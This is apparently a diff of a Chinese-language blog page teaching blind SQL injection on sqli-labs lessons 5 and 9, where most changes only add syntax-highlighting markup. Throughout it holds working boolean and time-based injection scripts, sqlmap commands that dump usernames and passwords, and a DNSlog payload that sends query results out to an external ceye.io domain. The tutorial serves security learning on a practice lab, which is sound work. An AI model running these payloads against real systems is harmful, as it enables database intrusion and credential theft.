+  <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+      url <span class="token operator">=</span> <span class="token triple-quoted-string string">'''http://139.224.112.182:8087/sqli1/Less-5/'''</span>
+      payload <span class="token operator">=</span> <span class="token triple-quoted-string string">'''?id=1' and length(database())=%d'''</span> <span class="token operator">%</span>i
+      r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token string">'%23'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># %23 &lt;==> --+</span>
+      <span class="token keyword">if</span> <span class="token string">'You are in'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'database_length:'</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>
+          <span class="token keyword">break</span>
+      <span class="token keyword">else</span><span class="token punctuation">:</span>
+          <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
 
-database_len()
-# 【database_length: 8】
+database_len<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># 【database_length: 8】</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h5 id="2-获取数据库名"><a href="#2-获取数据库名" class="headerlink" title="2.获取数据库名"></a>2.获取数据库名</h5><pre class="line-numbers language-lang-python"><code class="language-lang-python"># coding:utf-8
-import requests
-#获取数据库名
-def database_name():
-    name = ''
-    for j in range(1,9):
-        for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
-            url = "http://139.224.112.182:8087/sqli1/Less-5/"    
-            payload = "?id=1' and substr(database(),%d,1)='%s' --+"  %(j, i) 
-            r = requests.get(url + payload)
-            if 'You are in' in r.text:
-                name = name + i
-                print(name)
-                break
-    print('database_name:', name)
+<h5 id="2-获取数据库名"><a href="#2-获取数据库名" class="headerlink" title="2.获取数据库名"></a>2.获取数据库名</h5><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span>
+<span class="token keyword">import</span> requests
+<span class="token comment" spellcheck="true">#获取数据库名</span>
+<span class="token keyword">def</span> <span class="token function">database_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    name <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'</span><span class="token punctuation">:</span>
+            url <span class="token operator">=</span> <span class="token string">"http://139.224.112.182:8087/sqli1/Less-5/"</span>    
+            payload <span class="token operator">=</span> <span class="token string">"?id=1' and substr(database(),%d,1)='%s' --+"</span>  <span class="token operator">%</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> i<span class="token punctuation">)</span> 
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">'You are in'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                name <span class="token operator">=</span> name <span class="token operator">+</span> i
+                <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'database_name:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
 
-database_name()
-# 【database_name: security】
+database_name<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># 【database_name: security】</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h5 id="3-获取数据库中表"><a href="#3-获取数据库中表" class="headerlink" title="3.获取数据库中表"></a>3.获取数据库中表</h5><pre class="line-numbers language-lang-python"><code class="language-lang-python"># coding:utf-8
-import requests
-# 获取数据库表
-def tables_name():
-    name = ''
-    for j in range(1, 30):
-        for i in 'abcdefghijklmnopqrstuvwxyz,':
-            url = "http://139.224.112.182:8087/sqli1/Less-5/"    
-            payload = '''?id=1' and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%s' --+''' % (j, i)
-            r = requests.get(url + payload)
-            if 'You are in' in r.text:
-                name = name + i
-                print(name)
-                break
-    print('table_name:', name)
+<h5 id="3-获取数据库中表"><a href="#3-获取数据库中表" class="headerlink" title="3.获取数据库中表"></a>3.获取数据库中表</h5><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span>
+<span class="token keyword">import</span> requests
+<span class="token comment" spellcheck="true"># 获取数据库表</span>
+<span class="token keyword">def</span> <span class="token function">tables_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    name <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz,'</span><span class="token punctuation">:</span>
+            url <span class="token operator">=</span> <span class="token string">"http://139.224.112.182:8087/sqli1/Less-5/"</span>    
+            payload <span class="token operator">=</span> <span class="token triple-quoted-string string">'''?id=1' and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%s' --+'''</span> <span class="token operator">%</span> <span class="token punctuation">(</span>j<span class="token punctuation">,</span> i<span class="token punctuation">)</span>
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">'You are in'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                name <span class="token operator">=</span> name <span class="token operator">+</span> i
+                <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'table_name:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
 
-tables_name()
+tables_name<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-#【table_name: emails,referers,uagents,users】
+<span class="token comment" spellcheck="true">#【table_name: emails,referers,uagents,users】</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h5 id="4-获取表中字段"><a href="#4-获取表中字段" class="headerlink" title="4.获取表中字段"></a>4.获取表中字段</h5><pre class="line-numbers language-lang-python"><code class="language-lang-python"># coding:utf-8
-import requests
+<h5 id="4-获取表中字段"><a href="#4-获取表中字段" class="headerlink" title="4.获取表中字段"></a>4.获取表中字段</h5><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span>
+<span class="token keyword">import</span> requests
 
-# 获取表中字段
-def columns_name():
-    name = ''
-    for j in range(1, 30):
-        for i in 'abcdefghijklmnopqrstuvwxyz,':
-            url = "http://139.224.112.182:8087/sqli1/Less-5/"    
-            payload = "?id=1' and substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),%d,1)='%s' --+" %(j, i)        
-            r = requests.get(url + payload)
-            if 'You are in' in r.text:
-                name = name + i
-                print(name)
-                break
-    print('column_name:', name)
+<span class="token comment" spellcheck="true"># 获取表中字段</span>
+<span class="token keyword">def</span> <span class="token function">columns_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    name <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz,'</span><span class="token punctuation">:</span>
+            url <span class="token operator">=</span> <span class="token string">"http://139.224.112.182:8087/sqli1/Less-5/"</span>    
+            payload <span class="token operator">=</span> <span class="token string">"?id=1' and substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),%d,1)='%s' --+"</span> <span class="token operator">%</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> i<span class="token punctuation">)</span>        
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">'You are in'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                name <span class="token operator">=</span> name <span class="token operator">+</span> i
+                <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'column_name:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
 
-columns_name()
-#【column_name: id,username,password】
+columns_name<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#【column_name: id,username,password】</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h5 id="5-获取字段值"><a href="#5-获取字段值" class="headerlink" title="5.获取字段值"></a>5.获取字段值</h5><pre class="line-numbers language-lang-python"><code class="language-lang-python"># coding:utf-8
-import requests
-# 获取字段值
-def value():
-    name = ''
-    for j in range(1, 100):
-        for i in '0123456789abcdefghijklmnopqrstuvwxyz,_-':
-            url = "http://139.224.112.182:8087/sqli1/Less-5/"  
-            payload = "?id=1' and substr((select group_concat(username,password) from users),%d,1)='%s' --+" %(j, i)    
-            r = requests.get(url + payload)
-            if 'You are in' in r.text:
-                name = name + i
-                print(name)
-                break
-    print('value:', name)
+<h5 id="5-获取字段值"><a href="#5-获取字段值" class="headerlink" title="5.获取字段值"></a>5.获取字段值</h5><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span>
+<span class="token keyword">import</span> requests
+<span class="token comment" spellcheck="true"># 获取字段值</span>
+<span class="token keyword">def</span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    name <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyz,_-'</span><span class="token punctuation">:</span>
+            url <span class="token operator">=</span> <span class="token string">"http://139.224.112.182:8087/sqli1/Less-5/"</span>  
+            payload <span class="token operator">=</span> <span class="token string">"?id=1' and substr((select group_concat(username,password) from users),%d,1)='%s' --+"</span> <span class="token operator">%</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> i<span class="token punctuation">)</span>    
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">'You are in'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                name <span class="token operator">=</span> name <span class="token operator">+</span> i
+                <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'value:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
 
-value()
+value<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><h4 id="时间注入利用情景"><a href="#时间注入利用情景" class="headerlink" title="时间注入利用情景"></a>时间注入利用情景</h4><ul>
 <li>页面上没有显示位</li>
@@ -1408,118 +1407,122 @@ value()
 <li>正确的sql语句和错误的sql语句页面返回一致</li>
 </ul>
 <h4 id="手工实现时间盲注"><a href="#手工实现时间盲注" class="headerlink" title="手工实现时间盲注"></a>手工实现时间盲注</h4><p>靶机：sqli-labs第9关</p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">?id=1 
-?id=1'
-?id=1"
-#不管怎么样都不报错，不管对错一直显示一个固定的页面；
+<pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> 
+?id<span class="token operator">=</span><span class="token number">1</span>'
+?id<span class="token operator">=</span><span class="token number">1</span>"
+<span class="token comment" spellcheck="true">#不管怎么样都不报错，不管对错一直显示一个固定的页面；</span>
 
-#判断注入点
-?id=1' and sleep(3)--+
-#页面响应延迟，判断存在时间延迟型注入
+<span class="token comment" spellcheck="true">#判断注入点</span>
+?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span>
+<span class="token comment" spellcheck="true">#页面响应延迟，判断存在时间延迟型注入</span>
 
-#获取数据库名长度
-?id=1' and if(length(database())=8,sleep(3),1)--+
+<span class="token comment" spellcheck="true">#获取数据库名长度</span>
+?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span>
 
-#获取数据库名
-?id=1' and if(substr(database(),1,1)='s',sleep(3),1)--+
+<span class="token comment" spellcheck="true">#获取数据库名</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(substr(database(),1,1)='</span>s'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>结合<code>Burpsuite的Intruder模块</code>爆破数据库名</strong></p>
 <p>将获取数据库第一个字符的请求包拦截并发送到Intruder模块</p>
 <p>设置攻击变量以及攻击类型</p>
-<p><img src="https://i.loli.net/2020/05/15/cYjrQ6ygw3TxJGS.png" alt="">设置第一个攻击变量，这个变量是控制第几个字符的</p>
-<p><img src="https://i.loli.net/2020/05/15/Q9VEkKqtIJOcPdh.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/15/cYjrQ6ygw3TxJGS.png">设置第一个攻击变量，这个变量是控制第几个字符的</p>
+<p><img src="https://i.loli.net/2020/05/15/Q9VEkKqtIJOcPdh.png"></p>
 <p>设置第二个攻击变量，这个变量是数据库名字符</p>
-<p><img src="https://i.loli.net/2020/05/15/Ruzc9a1JPyVfKq3.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/15/Ruzc9a1JPyVfKq3.png"></p>
 <p>开始攻击，一小会就能得到测试结果，通过对长度和变量进行排序可以看到数据库名成功得到</p>
 <p><img src="https://i.loli.net/2020/05/15/izwlJ71SsEYByIO.png" alt="image-20200515211534056"></p>
 <p><strong>获取表名、字段名、字段信息等数据方法同上，就不赘述了</strong></p>
 <h4 id="SQLmap实现时间盲注"><a href="#SQLmap实现时间盲注" class="headerlink" title="SQLmap实现时间盲注"></a>SQLmap实现时间盲注</h4><pre><code>--batch: 用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。
 --technique:选择注入技术，-T:Time-based blind  （基于时间延迟注入）
 --threads 10 :设置线程为10，运行速度会更快。
-</code></pre><pre class="line-numbers language-lang-bash"><code class="language-lang-bash">#查询数据库 #【security】
-python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-9/?id=1 --technique T --dbs --batch --threads 10
+</code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#查询数据库 #【security】</span>
+python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-9/?id<span class="token operator">=</span>1 --technique T --dbs --batch --threads 10
 
-#获取数据库中的表 #【emails、referers、uagents、users】
-python sqlmap.py  -u http://139.224.112.182:8087/sqli1/Less-9/?id=1 --technique T -D security  --tables --batch --threads 10
+<span class="token comment" spellcheck="true">#获取数据库中的表 #【emails、referers、uagents、users】</span>
+python sqlmap.py  -u http://139.224.112.182:8087/sqli1/Less-9/?id<span class="token operator">=</span>1 --technique T -D security  --tables --batch --threads 10
 
-#获取表中的字段名 #【id、username、password】
-python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-9/?id=1 --technique T -D security -T users --columns --batch --threads 10 
+<span class="token comment" spellcheck="true">#获取表中的字段名 #【id、username、password】</span>
+python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-9/?id<span class="token operator">=</span>1 --technique T -D security -T <span class="token function">users</span> --columns --batch --threads 10 
 
-#获取字段信息 【Dumb|Dumb、dhakkan|dumbo ...】
-python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-9/?id=1 --technique T -D security -T users -C username,password --dump --batch --threads 10
+<span class="token comment" spellcheck="true">#获取字段信息 【Dumb|Dumb、dhakkan|dumbo ...】</span>
+python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-9/?id<span class="token operator">=</span>1 --technique T -D security -T <span class="token function">users</span> -C username,password --dump --batch --threads 10 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="脚本实现时间盲注"><a href="#脚本实现时间盲注" class="headerlink" title="脚本实现时间盲注"></a>脚本实现时间盲注</h4><h5 id="1-获取数据库名长度-1"><a href="#1-获取数据库名长度-1" class="headerlink" title="1.获取数据库名长度"></a>1.获取数据库名长度</h5><pre class="line-numbers language-lang-python"><code class="language-lang-python"># coding:utf-8
-import requests
-import datetime
+<h4 id="脚本实现时间盲注"><a href="#脚本实现时间盲注" class="headerlink" title="脚本实现时间盲注"></a>脚本实现时间盲注</h4><h5 id="1-获取数据库名长度-1"><a href="#1-获取数据库名长度-1" class="headerlink" title="1.获取数据库名长度"></a>1.获取数据库名长度</h5><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> datetime
 
-# 获取数据库名长度
-def database_len():
-    for i in range(1, 10):
-        url = '''http://139.224.112.182:8087/sqli1/Less-9/'''
-        payload = '''?id=1' and if(length(database())=%d,sleep(3),1)--+''' %i
-        time1 = datetime.datetime.now()
-        r = requests.get(url + payload)
-        time2 = datetime.datetime.now()
-        sec = (time2 - time1).seconds
-        if sec >= 3:
-            print('database_len:', i)
-            break
-        else:
-            print(i)
-
-database_len()
+<span class="token comment" spellcheck="true"># 获取数据库名长度</span>
+<span class="token keyword">def</span> <span class="token function">database_len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        url <span class="token operator">=</span> <span class="token triple-quoted-string string">'''http://139.224.112.182:8087/sqli1/Less-9/'''</span>
+        payload <span class="token operator">=</span> <span class="token triple-quoted-string string">'''?id=1' and if(length(database())=%d,sleep(3),1)--+'''</span> <span class="token operator">%</span>i
+        time1 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+        time2 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        sec <span class="token operator">=</span> <span class="token punctuation">(</span>time2 <span class="token operator">-</span> time1<span class="token punctuation">)</span><span class="token punctuation">.</span>seconds
+        <span class="token keyword">if</span> sec <span class="token operator">>=</span> <span class="token number">3</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'database_len:'</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+            
+database_len<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h5 id="2-获取数据库名-1"><a href="#2-获取数据库名-1" class="headerlink" title="2.获取数据库名"></a>2.获取数据库名</h5><pre class="line-numbers language-lang-python"><code class="language-lang-python"># coding:utf-8
-import requests
-import datetime
+<h5 id="2-获取数据库名-1"><a href="#2-获取数据库名-1" class="headerlink" title="2.获取数据库名"></a>2.获取数据库名</h5><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> datetime
 
-#获取数据库名
-def database_name():
-    name = ''
-    for j in range(1, 9):
-        for i in '0123456789abcdefghijklmnopqrstuvwxyz_':
-            url = '''http://139.224.112.182:8087/sqli1/Less-9/'''
-            payload = '''?id=1' and if(substr(database(),%d,1)='%s',sleep(1),1) --+''' % (j,i)
-            time1 = datetime.datetime.now()
-            r = requests.get(url + payload)
-            time2 = datetime.datetime.now()
-            sec = (time2 - time1).seconds
-            if sec >= 1:
-                name = name + i
-                print(name)
-                break
-    print('database_name:', name)
+<span class="token comment" spellcheck="true">#获取数据库名</span>
+<span class="token keyword">def</span> <span class="token function">database_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    name <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyz_'</span><span class="token punctuation">:</span>
+            url <span class="token operator">=</span> <span class="token triple-quoted-string string">'''http://139.224.112.182:8087/sqli1/Less-9/'''</span>
+            payload <span class="token operator">=</span> <span class="token triple-quoted-string string">'''?id=1' and if(substr(database(),%d,1)='%s',sleep(1),1) --+'''</span> <span class="token operator">%</span> <span class="token punctuation">(</span>j<span class="token punctuation">,</span>i<span class="token punctuation">)</span>
+            time1 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+            time2 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            sec <span class="token operator">=</span> <span class="token punctuation">(</span>time2 <span class="token operator">-</span> time1<span class="token punctuation">)</span><span class="token punctuation">.</span>seconds
+            <span class="token keyword">if</span> sec <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">:</span>
+                name <span class="token operator">=</span> name <span class="token operator">+</span> i
+                <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'database_name:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
 
-database_name()
+database_name<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>获取表名、字段名、字段信息等数据的脚本类似上面布尔盲注脚本，就不赘述了</strong></p>
 <h2 id="三、DNSlog盲注"><a href="#三、DNSlog盲注" class="headerlink" title="三、DNSlog盲注"></a>三、DNSlog盲注</h2><h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="什么是DNS"><a href="#什么是DNS" class="headerlink" title="什么是DNS"></a>什么是DNS</h4><p>DNS的全称是 <code>Domain Name System</code>（域名系统），它将域名解析为 IP，使人更方便地访问互联网。当用户输入某一网址如<code>www.baidu.com</code>，网络上的 DNS 服务器会将该域名解析，并找到对应的真实IP：<code>182.61.200.6</code>，使用户可以访问这台服务器上相应的服务。</p>
 <h4 id="什么是DNSlog"><a href="#什么是DNSlog" class="headerlink" title="什么是DNSlog"></a>什么是DNSlog</h4><p>DNSlog 就是存储在 DNS 服务器上的域名信息，它记录着用户对域名的访问信息，类似日志文件。SQL 盲注、命令执行、SSRF 及 XSS 等攻击而无法看到回显结果时，就会用到 DNSlog 技术。</p>
 <h4 id="为什么用Dnslog盲注"><a href="#为什么用Dnslog盲注" class="headerlink" title="为什么用Dnslog盲注"></a>为什么用Dnslog盲注</h4><p>对于SQL盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，最后导致 IP 被 ban，Dnslog 盲注可以减少发送的请求，直接回显数据实现注入。</p>
 <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>Mysql攻击语句:</strong></p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">select load_file(concat('\\\\',攻击语句,'.XXX.ceye.io\\abc'))
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> load_file<span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token string">'\\\\'</span><span class="token punctuation">,</span>攻击语句<span class="token punctuation">,</span><span class="token string">'.XXX.ceye.io\\abc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><strong>利用DNSlog的前提条件：</strong></p>
 <ul>
-<li><p>1.支持<code>load_file()</code>函数，通过执行 <code>show variables like &#39;%secure%&#39;;</code> 查看  <code>load_file()</code> 是否可以读取文件。    </p>
+<li><p>1.支持<code>load_file()</code>函数，通过执行 <code>show variables like &#39;%secure%&#39;;</code> 查看  <code>load_file()</code> 是否可以读取文件。	</p>
 <ul>
 <li>当secure_file_priv为空，就可以读取磁盘的目录。</li>
 <li>当secure_file_priv为G:\，就可以读取G盘的文件。</li>
 <li>当secure_file_priv为null，load_file就不能加载文件。</li>
-<li>通过设置my.ini来配置。secure_file_priv=””就是可以load_flie任意磁盘的文件。</li>
+<li>通过设置my.ini来配置。secure_file_priv&#x3D;””就是可以load_flie任意磁盘的文件。</li>
 </ul>
 </li>
 <li><p>2.DNSlog平台</p>
 <ul>
-<li><a target="_blank" rel="noopener" href="http://ceye.io">http://ceye.io</a></li>
-<li><a target="_blank" rel="noopener" href="http://www.dnslog.cn">http://www.dnslog.cn</a></li>
-<li><p><a target="_blank" rel="noopener" href="http://admin.dnslog.link">http://admin.dnslog.link</a></p>
+<li><p><a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://admin.dnslog.link/">http://admin.dnslog.link</a></p>
 </li>
 <li><p><a target="_blank" rel="noopener" href="https://github.com/bugscanteam/dnslog/">https://github.com/bugscanteam/dnslog/</a></p>
 </li>
 </ul>
 </li>
